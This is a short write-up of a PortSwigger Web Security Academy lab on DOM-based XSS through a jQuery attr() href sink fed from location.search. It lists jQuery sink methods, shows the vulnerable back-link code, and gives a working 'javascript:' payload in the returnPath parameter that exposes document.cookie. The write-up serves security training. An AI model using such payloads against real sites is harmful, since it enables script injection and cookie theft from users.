# [Lab: DOM XSS in jQuery anchor href attribute sink using location.search source](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink)

## Jquery Sink  

```plaintext
In the context of Cross-Site Scripting (XSS) vulnerabilities, 
a "sink" is a point in the code where untrusted input is 
inserted into the HTML document or executed as code, 
potentially leading to XSS attacks. jQuery, a popular 
JavaScript library, provides many functions that manipulate 
the DOM or execute JavaScript code, and these functions can 
act as sinks if they are used improperly.
```
## Vulnerable Sinks
`.html()` `.append()` `.prepend()` `.after()` `.before()`  

 `.val()` `.text()`  `.attr()` `.replaceWith()` `.wrap()`   

 `.wrapInner()` `.wrapAll()` `.load()` `.htmlPrefilter()`  
 
 `.prop()` `.css()` `.on()` 

## Process
```plaintext
----------------------------------------------------------------
1. Find the parameter where you can have the "back" button
2. Actually it is the feedback page where there is a back button
3. If you inspect the back button you will find an anchor href which is locating to the 
 home directory of the website

4. There will be a $ sign in the jquery syntax. 
```

## Frontend
```js
<div class="is-linkback">
    
    <a id="backLink" href="/">Back</a>

</div>
<script>
    
    $(function() { $('#backLink').attr("href", (newURLSearchParams(window.location.search)).get('returnPath')); });

</script>
```

## Link 
`https://0acc00d2030323cb80eb3a4300620029.web-security-academy.net/feedback?returnPath=/`

## Payload
```js
returnPath=javascript:alert(document.cookie)
// as we know javascript: is can be used in the anchor
``` 

## Frontend After the Exploitation
```js
<div class="is-linkback">
    
    <a id="backLink" href="javascript:alert(document.cookie)">Back</a>

</div>
<script>
    
    $(function() { $('#backLink').attr("href", (newURLSearchParams(window.location.search)).get('returnPath')); });

</script>

```
> ### *If we click the back button our exploit will be ran*

![dom_success](https://github.com/Ruhanyat-994/XSS/assets/110297704/84eeab5a-fb5d-48ad-838f-66ff0c1c8f4a)

